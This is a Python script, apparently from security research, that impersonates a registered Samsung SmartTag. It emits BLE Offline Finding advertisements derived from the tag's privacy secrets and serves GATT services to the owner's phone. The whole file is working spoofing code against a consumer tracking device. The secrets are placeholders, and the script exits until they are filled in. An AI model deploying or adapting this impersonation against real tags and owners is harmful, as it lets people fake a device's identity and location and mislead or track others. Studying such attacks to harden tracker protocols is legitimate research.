# -----------------------------------------------------------
# This script impersonates a registered SmartTag
# The impersonate tag implements essential functionalities of a legitimate tag:
#   - BLE advertising for Offline Finding
#   - interaction with owner's device via GATT
# (c) 2022 Tingfeng Yu
# -----------------------------------------------------------

import dbus, dbus.exceptions, dbus.mainloop.glib
from gi.repository import GLib
from gatt_agent import Agent
import logging
from bluepy.btle import DefaultDelegate
import warnings
from datetime import datetime
import warnings
from smarttag_crypto import EncryptionPIDManager, TagState
from smarttag_gatt_server import *
import config
import argparse
from utils import *
try:
    from gi.repository import GObject  # python3
except ImportError:
    import gobject as GObject  # python2

warnings.filterwarnings("ignore")
BLUEZ_SERVICE_NAME = 'org.bluez'
DBUS_OM_IFACE = 'org.freedesktop.DBus.ObjectManager'
LE_ADVERTISING_MANAGER_IFACE = 'org.bluez.LEAdvertisingManager1'
GATT_MANAGER_IFACE = 'org.bluez.GattManager1'
DBUS_PROP_IFACE = 'org.freedesktop.DBus.Properties'
AGENT_IFACE = 'org.bluez.Agent1'
AGNT_MNGR_IFACE = 'org.bluez.AgentManager1'
AGENT_PATH = '/my/app/agent'
AGNT_MNGR_PATH = '/org/bluez'
CAPABILITY = 'NoInputNoOutput'


class ScanDelegate(DefaultDelegate):
    def __init__(self):
        DefaultDelegate.__init__(self)

    def handleDiscovery(self, dev, isNewDev, isNewData):
        if isNewDev:
            logging.info("Discovered device " + dev.addr)
        elif isNewData:
            logging.info("Received new data from " + dev.addr)


class Application(dbus.service.Object):
    def __init__(self, bus):
        self.path = '/'
        self.services = []
        dbus.service.Object.__init__(self, bus, self.path)

    def get_path(self):
        return dbus.ObjectPath(self.path)

    def add_service(self, service):
        self.services.append(service)

    @dbus.service.method(DBUS_OM_IFACE, out_signature='a{oa{sa{sv}}}')
    def GetManagedObjects(self):
        response = {}
        for service in self.services:
            response[service.get_path()] = service.get_properties()
            chrcs = service.get_characteristics()
            for chrc in chrcs:
                response[chrc.get_path()] = chrc.get_properties()
        return response


class TagApplication(Application):
    def __init__(self, bus):
        Application.__init__(self, bus)
        self.add_service(TagAuthService(bus, 0))
        self.add_service(Tagfd5aService(bus, 1))
        self.add_service(TagDFUService(bus, 2))
        self.add_service(DeviceInfoService(bus, 3))
        self.add_service(Tagfd59Service(bus, 4))


class TagAgent(Agent):
    def __init__(self, bus):
        Agent.__init__(self, bus)
        self.add_service(TagAuthService(bus, 0))
        self.add_service(Tagfd5aService(bus, 1))
        self.add_service(TagDFUService(bus, 2))


def find_adapter(bus):
    remote_om = dbus.Interface(bus.get_object(BLUEZ_SERVICE_NAME, '/'),
                               DBUS_OM_IFACE)
    objects = remote_om.GetManagedObjects()
    for o, props in objects.items():
        if LE_ADVERTISING_MANAGER_IFACE in props and GATT_MANAGER_IFACE in props:
            return o
    return None


def endloop():
    config.mainloop.quit()
    return False


def advertise_smarttag_data(bus, ad_manager, agnt_mngr, interval_min):
    start_time = datetime.now()
    daysOld = 0
    data = config.myclass.generate_adv_data(TagState.OVERMATURE_OFFLINE, daysOld)
    print("adv data: {}, at: {}".format(data.hex(), datetime.now().strftime("%H:%M:%S")))
    adv = TagAdvertisement(bus, 0, data.hex())
    config.mainloop = GObject.MainLoop()
    ad_manager.RegisterAdvertisement(adv.get_path(), {}, reply_handler=register_ad_cb, error_handler=register_ad_error_cb)
    GObject.timeout_add_seconds(interval_min * 60, endloop)
    try:
        config.mainloop.run()
    except KeyboardInterrupt:
        adv.Release()
        agnt_mngr.UnregisterAgent(AGENT_PATH)
        config.mainloop.quit()
        exit()
    while True:
        if (datetime.now() - start_time).total_seconds() >= interval_min * 60:
            ad_manager.UnregisterAdvertisement(adv)
            dbus.service.Object.remove_from_connection(adv)
            data = config.myclass.generate_adv_data(TagState.OVERMATURE_OFFLINE)
            start_time = datetime.now()
            print("adv data: {}, at: {}".format(data.hex(), datetime.now().strftime("%H:%M:%S")))
            adv = TagAdvertisement(bus, 0, data.hex())
            config.mainloop = GObject.MainLoop()
            ad_manager.RegisterAdvertisement(adv.get_path(), {}, reply_handler=register_ad_cb, error_handler=register_ad_error_cb)
            GObject.timeout_add_seconds(interval_min * 60, endloop)
            try:
                config.mainloop.run()
            except KeyboardInterrupt:
                adv.Release()
                agnt_mngr.UnregisterAgent(AGENT_PATH)
                config.mainloop.quit()
                exit()


def main():
    config.init()  # initialize global variables
    print("Please manually configure privacyIV, privacyIdSeed, then remove this")
    exit()
    privacyIV = "TODO" # example: "3n8VUCrTT8KWDjkq8bF+OQ=="
    privacyIdSeed = "TODO" # example:  "AAAAAAApE+g="
    mastersecret = 'QQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQO=' # or sth else
    
    config.myclass = EncryptionPIDManager(mastersecret, privacyIV, privacyIdSeed)  # create an instance of the class containing
    dbus.mainloop.glib.DBusGMainLoop(set_as_default=True)
    bus = dbus.SystemBus()
    adapter = find_adapter(bus)
    if not adapter:
        print('BLE adapter not found')
        return
    adapter_props = dbus.Interface(bus.get_object(BLUEZ_SERVICE_NAME, adapter), "org.freedesktop.DBus.Properties");
    adapter_props.Set("org.bluez.Adapter1", "Powered", dbus.Boolean(1))
    ad_manager = dbus.Interface(bus.get_object(BLUEZ_SERVICE_NAME, adapter), LE_ADVERTISING_MANAGER_IFACE)
    service_manager = dbus.Interface(bus.get_object(BLUEZ_SERVICE_NAME, adapter), GATT_MANAGER_IFACE)
    app = TagApplication(bus)
    agnt_mngr = dbus.Interface(bus.get_object(BLUEZ_SERVICE_NAME, AGNT_MNGR_PATH), AGNT_MNGR_IFACE)
    config.mainloop = GLib.MainLoop()
    service_manager.RegisterApplication(app.get_path(), {}, reply_handler=register_app_cb, error_handler=register_app_error_cb)
    agnt_mngr.RegisterAgent(AGENT_PATH, CAPABILITY)
    agnt_mngr.RequestDefaultAgent(AGENT_PATH)
    advertise_smarttag_data(bus, ad_manager, agnt_mngr, 15)


if __name__ == '__main__':
    main()
